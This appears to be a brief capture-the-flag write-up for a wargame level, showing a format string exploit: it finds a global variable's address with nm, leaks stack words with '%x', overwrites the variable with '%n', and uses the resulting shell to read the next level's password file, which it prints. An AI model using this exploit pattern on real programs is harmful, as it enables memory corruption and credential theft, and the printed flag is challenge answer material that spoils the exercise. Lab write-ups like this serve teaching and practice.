# Level 03
- [Tuto](https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b)
- `./level3`
```
%d
512
```
- `nm level3`
<pre>
<strong>0804988c</strong> B m
</pre>
- `(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*5)") | ./level3`
<pre>
AAAA�200 b7fd1ac0 b7ff37d0 <strong>41414141 804988c</strong>
</pre>
- `(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + 'A'*25 + '%n')"; cat) | ./level3`
```
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
